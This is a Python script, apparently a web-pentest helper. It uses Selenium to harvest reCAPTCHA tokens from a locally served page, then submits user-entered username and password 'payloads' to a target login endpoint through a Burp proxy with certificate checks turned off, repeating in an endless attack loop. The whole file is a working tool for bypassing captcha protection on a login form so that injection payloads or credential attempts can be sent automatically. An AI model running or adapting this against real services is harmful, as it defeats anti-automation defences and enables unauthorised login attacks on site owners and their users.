from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import os
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Proxy in case you'll be routing your requests through BurpSuite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Sample login function that could use login / HERE YOU CAN JUST IMPLEMENT WHATEVER FUNCTION YOU WANT TO IN YOUR WEB PENTEST
def login(token):
    username = input("\nEnter your payload (username): ")
    password = input("\nEnter your payload (password): ")
    url = "YOUR TARGET URL"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Recaptcha-Token": token,
        "Content-Type": "application/json"
    }
    data = {
        "nit": username,
        "password":password
    }
    response = requests.post(url, proxies=proxies, verify=False, headers=headers, json=data)
    try:
        response_json = response.json()
        print("\nLogin Response (JSON):", response_json)
    except ValueError:
        print("\nLogin Response (Non-JSON):", response.text)


def bot():
    #we get the local site with auto recaptcha (you can use another host:port if you want to)
    #Also make sure that if you're using this locally, you must use a server that executes the php files.
    #You could use php -S 0.0.0.0:8888 in Windows or Linux based systems
    client.get(f"http://localhost:8888/token.html")
    #we wait some time for the page to load properly
    time.sleep(3)
    #we set the credentials like username:password and submit the form
    client.find_element(By.ID, "username").send_keys('username')
    client.find_element(By.ID, "password").send_keys('password')
    client.execute_script("document.getElementById('submitBtn').click()")
    #we close the browser
    #client.quit()

   #the file tokens.txt is created by process.php
    with open("tokens.txt", "r") as file:
        token = file.readline().strip()

    #we remove the file, so as we can create a new one with one single line containing the current token
    try:
        os.remove("tokens.txt")
    except OSError:
        pass
      
     #so if we call the bot, we want to finally return a valid recaptcha token
    return token

#we start the client for our bot
client = webdriver.Firefox()

#Loop to be getting tokens as many as we want to
while True:
    token = bot()
    login(token)
    print("\n[+] Generating token for a new attack...")
    
